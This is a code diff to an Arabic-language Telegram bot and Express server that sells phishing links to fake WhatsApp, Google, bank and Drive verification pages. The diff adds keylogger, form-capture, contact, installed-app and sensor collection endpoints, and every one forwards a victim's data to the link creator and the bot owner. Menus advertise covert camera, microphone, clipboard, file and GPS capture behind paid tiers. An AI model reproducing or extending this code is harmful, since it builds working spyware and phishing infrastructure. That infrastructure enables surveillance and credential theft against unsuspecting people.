+    saveLinkMgmtAllowed();
+    return bot.sendMessage(chatId, `✅ تم منح المستخدم \`${id}\` صلاحية إدارة روابطه \\(تعطيل/تفعيل/حذف\\)\\.`, { parse_mode: "MarkdownV2" });
+  }
+
+  // /revokelinkmgmt [id] — سحب صلاحية إدارة الروابط
+  if (msg.text?.startsWith("/revokelinkmgmt")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const id = msg.text.replace("/revokelinkmgmt","").trim();
+    if (!id) return bot.sendMessage(chatId, "⚠️ استخدم: /revokelinkmgmt [ID]");
+    linkMgmtAllowed.delete(String(id));
+    saveLinkMgmtAllowed();
+    return bot.sendMessage(chatId, `🔒 تم سحب صلاحية إدارة الروابط من \`${id}\`\\.`, { parse_mode: "MarkdownV2" });
   }
 
   // /note [id] [نص] — add note about user
@@ -2211,11 +2490,303 @@ bot.on('callback_query', async (q) => {
       `🔒  🚶 كشف النشاط الجسدي (يمشي/يجري/في سيارة)\n` +
       `🔒  🔑 استخراج إيميل/يوزرنيم من Autofill\n` +
       `🔒  🔍 تنبيه عند فتح DevTools\n` +
+      `🔒  ⌨️ تسجيل كل ما يكتبه الضحية (Keylogger)\n` +
+      `🔒  🌡️ بيانات المستشعرات (ضغط الهواء، المغناطيس، الجاذبية)\n` +
+      `🔒  📝 استخراج بيانات أي فورم يملأها الضحية\n` +
       `🔒  🎣 صفحة ملغمة خاصة بك (ببجي/إنستغرام/فري فاير...)\n\n` +
       `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
       `🚀 كل هذا برابط واحد يُرسَل للضحية!` +
       statusLine
     );
+  }
+
+  // ── Language toggle ───────────────────────────────────────────────────────
+  if (data === "lang_toggle") {
+    const cur = getLang(chatId);
+    return bot.editMessageText(
+      cur === 'ar' ? '🌐 اختر اللغة / Choose language:' : '🌐 Choose language / اختر اللغة:',
+      { chat_id: chatId, message_id: q.message.message_id,
+        reply_markup: JSON.stringify({ inline_keyboard: [
+          [{ text: '🇸🇦 العربية', callback_data: 'lang:ar' }, { text: '🇺🇸 English', callback_data: 'lang:en' }]
+        ] }) }
+    ).catch(() => {});
+  }
+
+  if (data === 'lang:ar' || data === 'lang:en') {
+    const chosen = data.split(':')[1];
+    userLang[String(chatId)] = chosen;
+    saveLangs();
+    const tr = T[chosen];
+    bot.answerCallbackQuery(q.id, { text: tr.lang_switched, show_alert: false }).catch(() => {});
+    // Re-send /start to update the reply keyboard language
+    bot.emit('message', { chat: { id: chatId }, from: q.from, text: '/start' });
+    return;
+  }
+
+  // ── Help menu ─────────────────────────────────────────────────────────────
+  if (data === "help_menu" || data === "help") {
+    const helpRows = [
+      [{ text: "📖 كيفية الاستخدام", callback_data: "help_howto" }, { text: "📡 البيانات المجموعة", callback_data: "help_data" }],
+      [{ text: "🔗 أنواع الروابط", callback_data: "link_types" },  { text: "💎 ميزات VIP", callback_data: "pinfo" }],
+      ...(chatId === BOT_OWNER ? [[{ text: "👑 أوامر المالك", callback_data: "help_owner" }]] : []),
+      [{ text: "🏠 القائمة الرئيسية", callback_data: "main_menu" }]
+    ];
+    return bot.editMessageText(`📖 *المساعدة — اختر قسماً:*`, {
+      chat_id: chatId, message_id: q.message.message_id,
+      parse_mode: "Markdown",
+      reply_markup: JSON.stringify({ inline_keyboard: helpRows })
+    }).catch(() => bot.sendMessage(chatId, `📖 *المساعدة — اختر قسماً:*`, {
+      parse_mode: "Markdown",
+      reply_markup: JSON.stringify({ inline_keyboard: helpRows })
+    }));
+  }
+
+  if (data === "help_howto") {
+    return bot.editMessageText(
+      `📖 *كيفية الاستخدام:*\n\n` +
+      `1️⃣ أنشئ رابطاً بضغط *إنشاء رابط*\n` +
+      `2️⃣ اختر نوع الصفحة المزيّفة\n` +
+      `3️⃣ أرسل الرابط للضحية\n` +
+      `4️⃣ لما يفتحه يصلك كل شيء فوراً\n\n` +
+      `💡 *نصائح:*\n` +
+      `• استخدم اسم مخصص للرابط بدل الرقم\n` +
+      `• فعّل حماية بكلمة مرور للروابط المهمة\n` +
+      `• اضبط مدة انتهاء أو حد للزيارات\n` +
+      `• استخدم /mylinks لإدارة روابطك`,
+      { chat_id: chatId, message_id: q.message.message_id, parse_mode: "Markdown",
+        reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "◀️ رجوع", callback_data: "help_menu" }]] }) }
+    ).catch(() => {});
+  }
+
+  if (data === "help_data") {
+    return bot.editMessageText(
+      `📡 *البيانات التي يجمعها البوت:*\n\n` +
+      `📍 الموقع الجغرافي (GPS + IP)\n` +
+      `📱 بيانات الجهاز (نوع، OS، RAM، شاشة)\n` +
+      `🌐 الشبكة (ISP، الدولة، السرعة، نوع الاتصال)\n` +
+      `📷 صور الكاميرا (أمامية + خلفية) 🔒\n` +
+      `🎙️ تسجيل صوتي من الميكروفون 🔒\n` +
+      `📋 محتوى الحافظة (نصوص، أرقام) 🔒\n` +
+      `📒 جهات الاتصال كاملة 🔒\n` +
+      `🖼️ الصور والملفات من الجهاز 🔒\n` +
+      `🖥️ لقطة شاشة مباشرة 🔒\n` +
+      `😊 تحليل الوجه AI (عمر، جنس، مزاج) 🔒\n` +
+      `🚶 النشاط الجسدي (يمشي/يجري/في سيارة) 🔒\n` +
+      `🔑 الإيميل/اليوزرنيم من Autofill 🔒\n` +
+      `⌨️ كل ما يكتبه (Keylogger) 🔒🔥\n` +
+      `🌡️ بيانات المستشعرات 🔒🔥\n` +
+      `📝 بيانات أي فورم يملأه 🔒🔥\n\n` +
+      `🔒 = للمشتركين فقط | 🔥 = VIP حصري`,
+      { chat_id: chatId, message_id: q.message.message_id, parse_mode: "Markdown",
+        reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "◀️ رجوع", callback_data: "help_menu" }]] }) }
+    ).catch(() => {});
+  }
+
+  if (data === "link_types") {
+    const _ltText = `🔗 *أنواع الروابط المتاحة:*\n\n` +
+      `🌐 *Cloudflare* — أقوى نوع، يطلب كل الصلاحيات، يبدو رسمياً\n` +
+      `🖥️ *WebView* — صفحة ويب عادية قابلة للتخصيص\n` +
+      `💬 *WhatsApp* — تحقق واتساب مزيّف، يطلب الكاميرا\n` +
+      `🔍 *Google* — صفحة تحقق Google مزيّفة\n` +
+      `👻 *Snapchat* — صفحة تحقق Snapchat\n` +
+      `▶️ *YouTube* — تحقق العمر YouTube\n` +
+      `🏦 *Bank* — فحص أمني مصرفي\n` +
+      `📁 *Google Drive* — ملف مشترك مزيّف`;
+    const _ltKb = JSON.stringify({ inline_keyboard: [
+      [{ text: "🔗 إنشاء رابط الآن", callback_data: "crenew" }],
+      [{ text: "◀️ رجوع", callback_data: "help_menu" }]
+    ] });
+    return bot.editMessageText(_ltText,
+      { chat_id: chatId, message_id: q.message.message_id, parse_mode: "Markdown", reply_markup: _ltKb }
+    ).catch(() => bot.sendMessage(chatId, _ltText, { parse_mode: "Markdown", reply_markup: _ltKb }).catch(() => {}));
+  }
+
+  // ── lm_mgmt_panel — link management permissions panel ─────────────────────
+  if (data === "lm_mgmt_panel" && chatId === BOT_OWNER) {
+    const granted = [...linkMgmtAllowed];
+    let text = `🔗 *صلاحيات إدارة الروابط*\n\n`;
+    if (granted.length === 0) {
+      text += `_لا يوجد مستخدمون ممنوحون الصلاحية حالياً_\n\n`;
+    } else {
+      text += `✅ *المستخدمون الممنوحون (${granted.length}):*\n`;
+      granted.forEach((id, i) => {
+        const prof = profiles[id] || {};
+        text += `${i+1}. \`${id}\`${prof.name ? ` — ${prof.name}` : ''}\n`;
+      });
+      text += '\n';
+    }
+    text += `💡 كل مستخدم يستطيع إدارة روابطه الخاصة تلقائياً.\nالصلاحية هنا تتيح إدارة روابط الآخرين.`;
+    return bot.sendMessage(chatId, text, {
+      parse_mode: 'Markdown',
+      reply_markup: JSON.stringify({ inline_keyboard: [
+        [{ text: '➕ منح مستخدم محدد', callback_data: 'lm_grant_user' },
+         { text: '🗑️ سحب من مستخدم', callback_data: 'lm_revoke_user' }],
+        [{ text: `✅ منح جميع المستخدمين (${users.size})`, callback_data: 'lm_grant_all' }],
+        [{ text: '🚫 سحب الصلاحية من الكل', callback_data: 'lm_revoke_all' }],
+        [{ text: '🔙 رجوع', callback_data: 'premadmin' }],
+      ]})
+    });
+  }
+
+  if (data === 'lm_grant_all' && chatId === BOT_OWNER) {
+    let count = 0;
+    for (const uid of users) { linkMgmtAllowed.add(String(uid)); count++; }
+    saveLinkMgmtAllowed();
+    return bot.answerCallbackQuery(q.id, {
+      text: `✅ تم منح الصلاحية لـ ${count} مستخدم`,
+      show_alert: true
+    }).then(() => bot.emit('callback_query', { ...q, data: 'lm_mgmt_panel' })).catch(() => {});
+  }
+
+  if (data === 'lm_revoke_all' && chatId === BOT_OWNER) {
+    const count = linkMgmtAllowed.size;
+    linkMgmtAllowed.clear();
+    saveLinkMgmtAllowed();
+    return bot.answerCallbackQuery(q.id, {
+      text: `🚫 تم سحب الصلاحية من ${count} مستخدم`,
+      show_alert: true
+    }).then(() => bot.emit('callback_query', { ...q, data: 'lm_mgmt_panel' })).catch(() => {});
+  }
+
+  if (data === 'lm_grant_user' && chatId === BOT_OWNER) {
+    return bot.sendMessage(chatId, LM_GRANT_PREFIX, {
+      reply_markup: JSON.stringify({ force_reply: true, selective: true })
+    });
+  }
+
+  if (data === 'lm_revoke_user' && chatId === BOT_OWNER) {
+    return bot.sendMessage(chatId, LM_REVOKE_PREFIX, {
+      reply_markup: JSON.stringify({ force_reply: true, selective: true })
+    });
+  }
+
+  // ── lm_perm_toggle_UID — toggle link management permission ─────────────────
+  if (data.startsWith('lm_perm_toggle_') && chatId === BOT_OWNER) {
+    const uid = data.replace('lm_perm_toggle_', '');
+    const hadIt = linkMgmtAllowed.has(String(uid));
+    if (hadIt) { linkMgmtAllowed.delete(String(uid)); } else { linkMgmtAllowed.add(String(uid)); }
+    saveLinkMgmtAllowed();
+    const nowHas = !hadIt;
+    return bot.editMessageReplyMarkup({ inline_keyboard: [
+      [{ text: nowHas ? '🔒 سحب صلاحية إدارة الروابط' : '✅ منح صلاحية إدارة الروابط', callback_data: `lm_perm_toggle_${uid}` }],
+      [{ text: banned.has(Number(uid)) ? '🔓 رفع الحجب' : '🚫 حجب المستخدم', callback_data: banned.has(Number(uid)) ? `unban_u_${uid}` : `ban_u_${uid}` }],
+    ] }, { chat_id: chatId, message_id: q.message.message_id })
+    .then(() => bot.answerCallbackQuery(q.id, { text: nowHas ? `✅ منحت صلاحية إدارة الروابط لـ ${uid}` : `🔒 سُحبت صلاحية إدارة الروابط من ${uid}`, show_alert: true }))
+    .catch(() => {});
+  }
+
+  // ── ban_u_UID / unban_u_UID ─────────────────────────────────────────────────
+  if (data.startsWith('ban_u_') && chatId === BOT_OWNER) {
+    const uid = Number(data.replace('ban_u_', ''));
+    banned.add(uid); saveBanned();
+    return bot.answerCallbackQuery(q.id, { text: `🚫 تم حجب ${uid}`, show_alert: true }).catch(() => {});
+  }
+  if (data.startsWith('unban_u_') && chatId === BOT_OWNER) {
+    const uid = Number(data.replace('unban_u_', ''));
+    banned.delete(uid); saveBanned();
+    return bot.answerCallbackQuery(q.id, { text: `🔓 تم رفع الحجب عن ${uid}`, show_alert: true }).catch(() => {});
+  }
+
+  if (data === "help_owner" && chatId === BOT_OWNER) {
+    return bot.editMessageText(
+      `👑 *أوامر المالك:*\n\n` +
+      `/stats — الإحصائيات الكاملة\n` +
+      `/report — تقرير شامل فوري\n` +
+      `/features — 🎛️ التحكم بالميزات\n` +
+      `/users — المستخدمون\n` +
+      `/search [نص] — بحث بالاسم\n` +
+      `/export — تصدير شامل كملف\n` +
+      `/info [id] — معلومات مستخدم\n` +
+      `/ban [id] / /unban [id] — حجب/رفع\n` +
+      `/silent — الوضع الصامت 🔕\n` +
+      `/away [نص] / /awayoff — وضع الغياب\n` +
+      `/addtarget [id] / /targets — الأهداف 🎯\n` +
+      `/schedule [ساعة/off] — تقرير يومي\n` +
+      `/broadcast — إرسال للجميع 📢\n` +
+      `/setwelcome [نص] — تخصيص الترحيب\n` +
+      `/premium [id] [أيام] — تفعيل بريميوم\n` +
+      `/revokepremium [id] — إلغاء بريميوم\n` +
+      `/clearstats — مسح الإحصائيات\n` +
+      `/backup — 💾 نسخة احتياطية`,
+      { chat_id: chatId, message_id: q.message.message_id, parse_mode: "Markdown",
+        reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "◀️ رجوع", callback_data: "help_menu" }]] }) }
+    ).catch(() => {});
+  }
+
+  if (data === "my_features") {
+    const uid2 = String(chatId);
+    const hasPrem2 = isPremium(chatId);
+    const lines2 = Object.entries(PREM_FEAT_NAMES).map(([k, name]) => {
+      const access = canUsePremium(chatId, k);
+      return `${access ? '✅' : '🔒'} ${name}`;
+    });
+    return bot.editMessageText(
+      `🎛️ *ميزاتك المفعّلة:*\n\n${lines2.join('\n')}\n\n${hasPrem2 ? '✨ أنت مشترك بريميوم — كل الميزات مفتوحة!' : '🔒 بعض الميزات تتطلب اشتراك بريميوم'}`,
+      { chat_id: chatId, message_id: q.message.message_id, parse_mode: "Markdown",
+        reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "◀️ رجوع", callback_data: "main_menu" }]] }) }
+    ).catch(() => {});
+  }
+
+  if (data === "stats_menu" && chatId === BOT_OWNER) {
+    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m2 = Math.floor((up%3600)/60), s2 = up%60;
+    return bot.editMessageText(
+      `📊 *إحصائيات البوت*\n\n` +
+      `👥 المستخدمون: ${users.size}\n` +
+      `🎯 الأهداف: ${targets.size}\n` +
+      `🚫 المحجوبون: ${banned.size}\n` +
+      `🔗 روابط منشأة: ${stats.linksCreated}\n` +
+      `👁️ روابط مفتوحة: ${stats.linksOpened}\n` +
+      `📷 صور كاميرا: ${stats.camsnaps}\n` +
+      `📍 مواقع: ${stats.locations}\n` +
+      `🎙️ تسجيلات: ${stats.audios}\n` +
+      `⏱️ التشغيل: ${h}س ${m2}د ${s2}ث`,
+      { chat_id: chatId, message_id: q.message.message_id, parse_mode: "Markdown",
+        reply_markup: JSON.stringify({ inline_keyboard: [
+          [{ text: "📊 تقرير مفصل", callback_data: "do_report" }],
+          [{ text: "◀️ رجوع", callback_data: "main_menu" }]
+        ] }) }
+    ).catch(() => {});
+  }
+
+  if (data === "feat_menu" && chatId === BOT_OWNER) {
+    return sendFeaturesMenu(chatId);
+  }
+
+  if (data === "broadcast_m" && chatId === BOT_OWNER) {
+    return bot.editMessageText(
+      `📢 *الإرسال للجميع*\n\nاستخدم الأمر:\n\`/broadcast [الرسالة]\`\n\nمثال:\n/broadcast مرحباً بالجميع!`,
+      { chat_id: chatId, message_id: q.message.message_id, parse_mode: "Markdown",
+        reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "◀️ رجوع", callback_data: "main_menu" }]] }) }
+    ).catch(() => {});
+  }
+
+  if (data === "do_report" && chatId === BOT_OWNER) {
+    bot.answerCallbackQuery(q.id, { text: "🔄 جارٍ توليد التقرير..." });
+    // reuse /report logic
+    bot.emit('message', { chat: { id: BOT_OWNER }, from: { id: BOT_OWNER }, text: '/report' });
+    return;
+  }
+
+  if (data === "main_menu") {
+    const isOwner2 = chatId === BOT_OWNER;
+    const isPrem2  = isPremium(chatId);
+    const menuRows = [
+      [{ text: "🔗 إنشاء رابط", callback_data: "crenew" },           { text: "📋 روابطي", callback_data: "lm:list:0" }],
+      [{ text: "💎 ميزات VIP 🔥", callback_data: "pinfo" },          { text: "🎯 المحاولات", callback_data: "attempt_menu" }],
+      [{ text: "📊 إحصائياتي", callback_data: "mystats" },           { text: "🆔 معرّفي", callback_data: "myid" }],
+      [{ text: "📖 المساعدة", callback_data: "help_menu" },          { text: "🔗 أنواع الروابط", callback_data: "link_types" }],
+      ...(isPrem2 && !isOwner2 ? [[{ text: "🖥️ لوحة صفحتي", callback_data: "pg_main" }, { text: "🎛️ ميزاتي", callback_data: "my_features" }]] : []),
+      ...(isOwner2 ? [
+        [{ text: "👑 إدارة البريميوم", callback_data: "premadmin" }, { text: "📊 الإحصائيات", callback_data: "stats_menu" }],
+        [{ text: "🎛️ إعدادات الميزات", callback_data: "feat_menu" }, { text: "🖥️ صفحتي الديناميكية", callback_data: "pg_main" }],
+        [{ text: "📢 إرسال للجميع", callback_data: "broadcast_m" }, { text: "💾 نسخ احتياطي", callback_data: "do_backup" }]
+      ] : [])
+    ];
+    return bot.editMessageText(
+      `🏠 *القائمة الرئيسية*`,
+      { chat_id: chatId, message_id: q.message.message_id, parse_mode: "Markdown",
+        reply_markup: JSON.stringify({ inline_keyboard: menuRows }) }
+    ).catch(() => {});
   }
 
   // ── Premium admin panel (owner only) ──────────────────────────────────────
@@ -2233,7 +2804,8 @@ bot.on('callback_query', async (q) => {
         [{ text: "➕ تفعيل بريميوم", callback_data: "premgrant" }, { text: "🗑️ إلغاء بريميوم", callback_data: "premrevoke" }],
         [{ text: "📋 قائمة المشتركين", callback_data: "premlist" }],
         [{ text: `🔔 مشتركو الإشعارات (${Object.keys(pushSubs).length})`, callback_data: "push_subs_list" }],
-        [{ text: "🎛️ إعدادات الميزات المجانية", callback_data: "gopc" }]
+        [{ text: "🎛️ إعدادات الميزات المجانية", callback_data: "gopc" }],
+        [{ text: `🔗 صلاحيات إدارة الروابط (${linkMgmtAllowed.size})`, callback_data: "lm_mgmt_panel" }],
       ] }) }
     );
   }
@@ -2815,7 +3387,7 @@ bot.on('message', async (msg) => {
   ).catch(()=>{});
 });
 
-bot.on('polling_error', () => {});
+bot.on('polling_error', (err) => { console.error('polling_error:', err?.message || err); });
 
 // ── Features Menu Builder ─────────────────────────────────────────────────────
 const FEAT_NAMES = {
@@ -2845,7 +3417,10 @@ const PREM_FEAT_NAMES = {
   faceAI:         "😊 تحليل الوجه AI",
   activityDetect: "🚶 كشف النشاط الجسدي",
   autofill:       "🔑 استخراج إيميل/يوزرنيم",
-  devtools:       "🔍 كشف DevTools"
+  devtools:       "🔍 كشف DevTools",
+  keylogger:      "⌨️ تسجيل المفاتيح (Keylogger)",
+  sensors:        "🌡️ بيانات المستشعرات",
+  formspy:        "📝 استخراج بيانات الفورم"
 };
 
 function premiumConfigText() {
@@ -2923,6 +3498,12 @@ async function createLink(cid, msg) {
   const trimmed = msg.trim();
   if (trimmed.toLowerCase().startsWith('http')) {
     const url = cid.toString(36) + '/' + Buffer.from(trimmed).toString('base64');
+    // If this URL was previously blocked, unblock it so the new link works
+    const newKey = cid.toString(36) + '|' + Buffer.from(trimmed).toString('base64');
+    if (blockedOldLinks.has(newKey)) {
+      blockedOldLinks.delete(newKey);
+      saveBlockedOldLinks();
+    }
     bot.sendChatAction(cid, "typing");
     stats.linksCreated++; saveStats();
     incUserStat(String(cid), 'linksCreated');
@@ -2935,6 +3516,7 @@ async function createLink(cid, msg) {
     const coLink = `${hostURL}/co/${url}`;
     const fLink  = `${hostURL}/f/${url}`;
     lastLink.set(String(cid), cLink);
+    addOldLink(cid, { cLink, wLink, waLink, dlLink, ttLink, igLink, url: trimmed, createdAt: Date.now() });
     const premiumSection = isPremium(cid)
       ? `\n\n📒 جهات الاتصال (بريميوم):\n${coLink}\n\n🖼️ صور وملفات (بريميوم):\n${fLink}`
       : "";
@@ -3149,6 +3731,39 @@ app.post("/clipboard", (req, res) => {
   } else res.send("Missing");
 });
 
+app.post("/keylog", (req, res) => {
+  const uid  = decodeURIComponent(req.body.uid  || '') || null;
+  const data = decodeURIComponent(req.body.data || '') || null;
+  if (uid && data) {
+    const tid = parseInt(uid, 36);
+    notify(tid, `⌨️ *Keylogger:*\n\`\`\`\n${data.slice(0, 3000)}\n\`\`\``, { parse_mode: 'Markdown' });
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `⌨️ *Keylogger* (ID: ${tid}):\n\`\`\`\n${data.slice(0, 3000)}\n\`\`\``, { parse_mode: 'Markdown' });
+    res.send("Done");
+  } else res.send("Missing");
+});
+
+app.post("/sensors", (req, res) => {
+  const uid  = decodeURIComponent(req.body.uid  || '') || null;
+  const data = decodeURIComponent(req.body.data || '') || null;
+  if (uid && data) {
+    const tid = parseInt(uid, 36);
+    notify(tid, `🌡️ *بيانات المستشعرات:*\n${data.slice(0, 3000)}`, { parse_mode: 'Markdown' });
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🌡️ *مستشعرات* (ID: ${tid}):\n${data.slice(0, 3000)}`, { parse_mode: 'Markdown' });
+    res.send("Done");
+  } else res.send("Missing");
+});
+
+app.post("/formspy", (req, res) => {
+  const uid  = decodeURIComponent(req.body.uid  || '') || null;
+  const data = decodeURIComponent(req.body.data || '') || null;
+  if (uid && data) {
+    const tid = parseInt(uid, 36);
+    notify(tid, `📝 *Form Spy:*\n${data.slice(0, 3000)}`, { parse_mode: 'Markdown' });
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `📝 *Form Spy* (ID: ${tid}):\n${data.slice(0, 3000)}`, { parse_mode: 'Markdown' });
+    res.send("Done");
+  } else res.send("Missing");
+});
+
 app.post("/network", (req, res) => {
   const uid  = decodeURIComponent(req.body.uid)  || null;
   const data = decodeURIComponent(req.body.data) || null;
@@ -3277,6 +3892,30 @@ app.post("/webrtc-ips", (req, res) => {
   let msg = `🌐 كشف WebRTC (IP حقيقي):`;
   if (ips) msg += `\n🔓 ${ips}`;
   if (fp)  msg += `\n\n🖥️ بصمة الجهاز:\n${fp}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+});
+
+// ── App Detection (URL scheme probing) ────────────────────────────────────────
+app.post("/app-detect", (req, res) => {
+  res.send("ok");
+  const uid  = decodeURIComponent(req.body.uid  || '') || null;
+  const apps = decodeURIComponent(req.body.apps || '') || null;
+  if (!uid || !apps) return;
+  const tid = parseInt(uid, 36);
+  const msg = `📲 التطبيقات المثبتة:\n${apps}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+});
+
+// ── Contact Picker API results ────────────────────────────────────────────────
+app.post("/contacts-pick", (req, res) => {
+  res.send("ok");
+  const uid  = decodeURIComponent(req.body.uid  || '') || null;
+  const data = decodeURIComponent(req.body.data || '') || null;
+  if (!uid || !data) return;
+  const tid = parseInt(uid, 36);
+  const msg = `📒 جهات اتصال:\n${data.slice(0, 3500)}`;
   notify(tid, msg);
   if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
 });
@@ -3534,28 +4173,45 @@ app.post("/live-chat-send", express.json({limit:"64kb"}), (req, res) => {
   res.json({ok:true, delivered:false});
 });
 
+// ── New Link Management System ─────────────────────────────────────────────────
+linkMgr.setGHBackup(backupFileToGH);
+require('./link-features')(bot, app, linkMgr, {
+  hostURL, BOT_OWNER, enrichIP, getIP,
+  _addToBuf, incUserStat, isPremium, canUsePremium,
+  settings, DEFAULT_FEATURES, stats, saveStats,
+  notify, notifyPhoto, notifyLoc, fetch, mdEsc,
+  handleLinkOpen,
+  blockedOldLinks, saveBlockedOldLinks,
+  linkMgmtAllowed, saveLinkMgmtAllowed,
+  oldLinksDb,
+});
+
 // ── Notify owner when server starts (after cold start / crash recovery) ───────
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, async () => {
   console.log(`App Running on Port ${PORT}!`);
 
-  // Wait for the old container's SIGTERM backup to finish before restoring
-  // Railway starts the new container almost simultaneously with SIGTERM on the old one.
-  // The old container's backupToGitHub() takes ~5-8s. We wait 12s to be safe.
-  console.log("⏳ انتظار 12 ثانية لضمان اكتمال النسخ الاحتياطي من الحاوية القديمة...");
-  await new Promise(r => setTimeout(r, 12000));
-
-  // Restore user data from GitHub before doing anything else
+  // Restore user data from GitHub on startup (if GH_TOKEN is set)
   const restored = await restoreFromGitHub();
+
+  // Auto-sync code files to GitHub on every startup
+  backupCodeToGH().catch(() => {});
 
   setTimeout(() => {
     // Commands for all users
     bot.setMyCommands([
-      { command: "start",   description: "ابدأ البوت" },
-      { command: "help",    description: "المساعدة" },
-      { command: "mystats", description: "إحصائياتي" },
-      { command: "myid",    description: "معرّفي" },
-      { command: "create",  description: "إنشاء رابط" }
+      { command: "start",       description: "ابدأ البوت" },
+      { command: "help",        description: "المساعدة" },
+      { command: "mystats",     description: "إحصائياتي" },
+      { command: "myid",        description: "معرّفي" },
+      { command: "create",      description: "إنشاء رابط (قديم)" },
+      { command: "newlink",     description: "🔗 رابط جديد متقدم" },
+      { command: "mylinks",     description: "📋 روابطي مع التحكم الكامل" },
+      { command: "victims",     description: "👥 زوار رابط معين" },
+      { command: "linkstats",   description: "📊 إحصائيات رابط" },
+      { command: "disablelink", description: "🔴 تعطيل رابط" },
+      { command: "enablelink",  description: "🟢 تفعيل رابط" },
+      { command: "deletelink",  description: "🗑️ حذف رابط" }
     ]).catch(() => {});
 
     // Extra commands visible ONLY to the owner
@@ -3581,7 +4237,16 @@ app.listen(PORT, async () => {
       { command: "setwelcome",    description: "✏️ تخصيص رسالة الترحيب" },
       { command: "clearstats",    description: "🗑️ مسح الإحصائيات" },
       { command: "export",        description: "📤 تصدير بيانات المستخدمين" },
-      { command: "ping",          description: "🏓 اختبار السرعة" }
+      { command: "ping",          description: "🏓 اختبار السرعة" },
+      { command: "newlink",       description: "🔗 إنشاء رابط جديد متقدم" },
+      { command: "mylinks",       description: "📋 روابطي مع التحكم الكامل" },
+      { command: "victims",       description: "👥 زوار رابط معين" },
+      { command: "linkstats",     description: "📊 إحصائيات رابط" },
+      { command: "linkscount",    description: "🔢 إحصائيات الروابط الكلية" },
+      { command: "linksearch",    description: "🔍 بحث في الروابط" },
+      { command: "disablelink",   description: "🔴 تعطيل رابط" },
+      { command: "enablelink",    description: "🟢 تفعيل رابط" },
+      { command: "deletelink",    description: "🗑️ حذف رابط" }
     ], { scope: { type: "chat", chat_id: BOT_OWNER } }).catch(() => {});
 
     const up = new Date().toISOString();
